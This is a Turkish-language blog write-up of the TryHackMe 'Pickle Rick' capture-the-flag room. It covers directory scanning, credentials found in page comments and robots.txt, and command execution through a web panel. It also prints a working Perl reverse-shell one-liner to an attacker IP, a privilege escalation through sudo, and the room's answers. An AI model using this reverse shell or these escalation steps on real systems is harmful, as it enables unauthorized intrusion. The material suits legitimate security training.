<!doctype html><html lang=en><head><title>TryHackMe | Pickle Rick Write-Up :: 0xdak</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Bu içerik TryHackMe platformundaki PickleRick CTF’inin çözümünü içerir. Çözmek isteyenler için: https://tryhackme.com/room/picklerick
Bu Rick and Morty temalı challenge, Rick’in kendini turşudan insana geri döndürmesi için yapılacak iksirin 3 malzemesini bir web sunucusunun zaafiyetlerinden yararlanarak elde etmeyi gerektirir.
Daha önceden çözdüğüm başka bir keyifli Rick and Morty temalı CTF daha önereceğim:
https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/
Makineyi başlatıyorum.
Hedef siteye gittiğimizde bizi Rick’in istifralarıyla dolu cümleleri karşılıyor.
Rick bizden iksirin malzemelerini bulmamız için bilgisayarına girmemiz gerektiğini ama parolasını hatırlamadığını söylüyor."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/posts/tryhackme-32bed/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/pink.css><link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="TryHackMe | Pickle Rick Write-Up"><meta property="og:description" content="Bu içerik TryHackMe platformundaki PickleRick CTF’inin çözümünü içerir. Çözmek isteyenler için: https://tryhackme.com/room/picklerick
Bu Rick and Morty temalı challenge, Rick’in kendini turşudan insana geri döndürmesi için yapılacak iksirin 3 malzemesini bir web sunucusunun zaafiyetlerinden yararlanarak elde etmeyi gerektirir.
Daha önceden çözdüğüm başka bir keyifli Rick and Morty temalı CTF daha önereceğim:
https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/
Makineyi başlatıyorum.
Hedef siteye gittiğimizde bizi Rick’in istifralarıyla dolu cümleleri karşılıyor.
Rick bizden iksirin malzemelerini bulmamız için bilgisayarına girmemiz gerektiğini ama parolasını hatırlamadığını söylüyor."><meta property="og:url" content="/posts/tryhackme-32bed/"><meta property="og:site_name" content="0xdak"><meta property="og:image" content="/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-04-10 16:10:00 +0300 +0300"></head><body class=pink><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>0xdak</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/>Blog</a></li><li><a href=/about>Hakkımda</a></li><li><a href=/terms>Terimler</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/>Blog</a></li><li><a href=/about>Hakkımda</a></li><li><a href=/terms>Terimler</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=/posts/tryhackme-32bed/>TryHackMe | Pickle Rick Write-Up</a></h1><div class=post-meta><span class=post-date>2022-04-10</span></div><div class=post-content><div><p>Bu içerik TryHackMe platformundaki PickleRick CTF’inin çözümünü içerir. Çözmek isteyenler için: <a href=https://tryhackme.com/room/picklerick>https://tryhackme.com/room/picklerick</a></p><p>Bu Rick and Morty temalı challenge, Rick’in kendini turşudan insana geri döndürmesi için yapılacak iksirin 3 malzemesini bir web sunucusunun zaafiyetlerinden yararlanarak elde etmeyi gerektirir.</p><p>Daha önceden çözdüğüm başka bir keyifli Rick and Morty temalı CTF daha önereceğim:</p><p><a href=https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/>https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/</a></p><p>Makineyi başlatıyorum.</p><p>Hedef siteye gittiğimizde bizi Rick’in istifralarıyla dolu cümleleri karşılıyor.</p><p><img src=/img/TryHackMe%20%2032bed/Untitled.png alt=Untitled></p><p>Rick bizden iksirin malzemelerini bulmamız için bilgisayarına girmemiz gerektiğini ama parolasını hatırlamadığını söylüyor.</p><p>İlk önce bir ipucu var mı diye sayfa kaynağını görüntülüyorum.</p><p>Altta yorum satırları içinde ipucumuz bizi bekliyor.</p><pre tabindex=0><code> &lt;!--

    Note to self, remember username!

    Username: R1ckRul3s

  --&gt;
</code></pre><p>Anasayfadaki resmi yeni sekmede açtığımızda nerede depolandığını görüyoruz.</p><p>/assets/ yoluna gittiğimizde bazı dosyaları görüyorum. Belki ilerde bir reverse shell yükleyebiliriz.</p><p>F12 ile cookie’lere bakıyorum bir şey bulamıyorum.</p><p>nmap ile 22 SSH portunun açık olduğunu görüyorum.</p><p><img src=/img/TryHackMe%20%2032bed/Untitled%201.png alt=Untitled></p><p>Gobuster ile url’yi tarıyorum.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#a6e22e>gobuster</span> <span style=color:#a6e22e>dir</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>u</span> [<span style=color:#a6e22e>https</span><span style=color:#f92672>:</span><span style=color:#75715e>//10-10-4-52.p.thmlabs.com](https://10-10-4-52.p.thmlabs.com/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span></span></code></pre></div><p>Gobuster ile ne kadar denesem de bir sonuç alamıyorum.</p><p>Bunun yerine dirsearch ile tarıyorum ve çıkan sonuçlar:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span>[<span style=color:#ae81ff>13</span><span style=color:#f92672>:</span><span style=color:#ae81ff>46</span><span style=color:#f92672>:</span><span style=color:#ae81ff>18</span>] <span style=color:#ae81ff>200</span> <span style=color:#f92672>-</span>    <span style=color:#ae81ff>2</span><span style=color:#a6e22e>KB</span> <span style=color:#f92672>-</span> <span style=color:#e6db74>/assets/</span>                                     
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>13</span><span style=color:#f92672>:</span><span style=color:#ae81ff>46</span><span style=color:#f92672>:</span><span style=color:#ae81ff>39</span>] <span style=color:#ae81ff>200</span> <span style=color:#f92672>-</span>    <span style=color:#ae81ff>1</span><span style=color:#a6e22e>KB</span> <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>/index.html                                       </span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>13</span><span style=color:#f92672>:</span><span style=color:#ae81ff>46</span><span style=color:#f92672>:</span><span style=color:#ae81ff>42</span>] <span style=color:#ae81ff>200</span> <span style=color:#f92672>-</span>  <span style=color:#ae81ff>882</span><span style=color:#a6e22e>B</span>  <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>/login.php                                        </span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>13</span><span style=color:#f92672>:</span><span style=color:#ae81ff>46</span><span style=color:#f92672>:</span><span style=color:#ae81ff>53</span>] <span style=color:#ae81ff>200</span> <span style=color:#f92672>-</span>   <span style=color:#ae81ff>17</span><span style=color:#a6e22e>B</span>  <span style=color:#f92672>-</span> <span style=color:#960050;background-color:#1e0010>/robots.txt</span>
</span></span></code></pre></div><p>robots.txt’de Rick anlamsızca <code>Wubbalubbadubdub</code> diyor.</p><p>login.php’de önüme bir login ekranı çıkıyor.</p><p>username’i zaten biliyoruz. Şifre için bir brute-force attack uygulayabiliriz.</p><p>Burpsuit’in free kısmında zaman sınırlaması konulduğu için hydra kullanmayı tercih ediyorum.</p><p>hydra’yı birkaç wordlist ile deniyorum ama başarısız sonuç alıyorum.</p><p>Sonra aklıma anlamsızca dediğim <code>Wubbalubbadubdub</code> geliyor.</p><p>Deniyorum ve sonuç başarılı.</p><p>Şimdilik sadece command panel’i görebiliyorum diğer sayfalara yetkim yok.</p><p><img src=/img/TryHackMe%20%2032bed/Untitled%202.png alt=Untitled></p><p>Dizini ls komutuyla listeliyorum ve <code>Sup3rS3cretPickl3Ingred.txt</code>&lsquo;i cat komutuyla yazdırıyorum ama başarısız.</p><p><img src=/img/TryHackMe%20%2032bed/Untitled%203.png alt=Untitled></p><p>Sonra dizin olarak <code>Sup3rS3cretPickl3Ingred.txt</code>&lsquo;e gitmeyi düşünüyorum ve</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span>[<span style=color:#a6e22e>http</span><span style=color:#f92672>:</span><span style=color:#75715e>//10.10.4.52/Sup3rS3cretPickl3Ingred.txt](http://10.10.4.52/Sup3rS3cretPickl3Ingred.txt)
</span></span></span></code></pre></div><p>ilk malzememizi buluyorum: <code>mr. meeseek hair</code></p><p>clue.txt’de ipucu var mı diye bakıyorum.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#a6e22e>Look</span> <span style=color:#a6e22e>around</span> <span style=color:#a6e22e>the</span> <span style=color:#a6e22e>file</span> <span style=color:#a6e22e>system</span> <span style=color:#66d9ef>for</span> <span style=color:#a6e22e>the</span> <span style=color:#a6e22e>other</span> <span style=color:#a6e22e>ingredient</span>.
</span></span></code></pre></div><p>portal.php’in kaynak html kodunda yorum satırında bir şey buluyorum.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#a6e22e>Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0</span><span style=color:#f92672>==</span>
</span></span></code></pre></div><p>Sondaki eşittirleri silip cyberchef’te base64’ten çeviriyorum ve bir kaç kez dönen sonucu yaptıktan sonra ortaya çıkan deşifre:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#a6e22e>rabbit</span> <span style=color:#a6e22e>hole</span>
</span></span></code></pre></div><p>“ls /home” komutunu girince iki tane kullanıcı karşıma çıkıyor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#a6e22e>rick</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ubuntu</span>
</span></span></code></pre></div><p>“ls /home/rick” komutunu girince ikinci malzemenin burada olduğunu anlıyorum.</p><p>“cp /home/rick/* .” komutu ile dosyayı buraya kopyalamaya çalışıyorum ama olmuyor.</p><p>cat komutu çalışmıyor bunun yerine less komutunu deniyorum, dosyanın içeriğini görüntülüyorum ve ikinci malzememiz: <code>1 jerry tear</code></p><p>Artık reverse shell ile komut satırına geçmenin zamanıdır diye düşünüyorum ve internette bash ile reverse shell oluşturabilecek kod parçası arıyorum.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span>	<span style=color:#a6e22e>perl</span> <span style=color:#f92672>-</span><span style=color:#a6e22e>e</span> <span style=color:#e6db74>&#39;use Socket;$i=&#34;10.8.52.245&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
</span></span></code></pre></div><p>Deniyorum ve işe yarıyor.</p><p><img src=/img/TryHackMe%20%2032bed/Untitled%204.png alt=Untitled></p><p>find / -perm -u=s -type f 2>/dev/null komutuyla sudo’ya yetkisi olan dosyaları listeliyoruz.</p><p>Burdan da bize ekmek çıkmıyor.</p><p>sudo komutundan ilerliyorum. sudo -l komutuyla aldığım çıktıyla anlıyorum ki www-data kullanıcısı sudo komutunu şifresiz istediği yerde kullanabilir.</p><p><img src=/img/TryHackMe%20%2032bed/Untitled%205.png alt=Untitled></p><p>Finallerin /root’da olacağı aklıma geliyor</p><p>“sudo ls /root/” ile listeliyorum.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>rd</span>.<span style=color:#a6e22e>txt</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>snap</span>
</span></span></code></pre></div><p>“sudo cat /root/3rd.txt”</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>rd</span> <span style=color:#a6e22e>ingredients</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>fleeb</span> <span style=color:#a6e22e>juice</span>
</span></span></code></pre></div><p>ve son malzememiz: <code>fleeb juice</code></p><p>Yazdığım içeriği okuduğunuz için teşekkür ederim. İyi çalışmalar.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Diğer yazılara göz at</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/posts/a2-2017-5c716/><span class=button__text>A2 2017 - Broken Authentication | Türkçe Çeviri</span>
<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script></div></body></html>